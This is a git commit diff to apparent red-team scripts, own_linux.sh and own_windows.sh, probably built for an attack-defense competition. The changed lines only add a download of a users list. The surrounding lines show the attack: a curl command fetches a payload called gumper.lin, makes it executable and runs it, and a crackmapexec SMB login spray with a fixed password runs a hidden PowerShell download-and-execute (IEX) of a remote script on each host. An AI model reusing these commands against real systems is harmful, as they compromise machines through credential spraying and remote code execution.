226d35513f0bad8243919bb0c75bd55861541521
stackviolator <joshmerrill255@gmail.com>
2024-03-01 21:49:05 -0500

    stager windows - done

--- red-scripts/own_linux.sh
+++ red-scripts/own_linux.sh
@@ -4,6 +4,7 @@ USER_FILE="linux.txt"
 CURL_COMMAND="curl -s -o ~/.gumper.lin https://github.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/raw/main/red-scripts/payloads/gumper.lin; chmod +x ~/.gumper.lin; ~/.gumper.lin"
 
 curl -o linux.txt https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/hosts/linux.txt
+curl -o users.txt https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/users.txt
 
 if [ ! -f "$USER_FILE" ]; then
     echo "The file $USER_FILE does not exist."
--- red-scripts/own_windows.sh
+++ red-scripts/own_windows.sh
@@ -1,5 +1,6 @@
 #!/bin/bash
 
 curl -o windows.txt https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/hosts/windows.txt
+curl -o users.txt https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/users.txt
 
 crackmapexec smb windows.txt -u users.txt -p 'Change.me123!' -x "powershell -nop -w hidden -ep bypass IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/red-scripts/update.ps1')"&
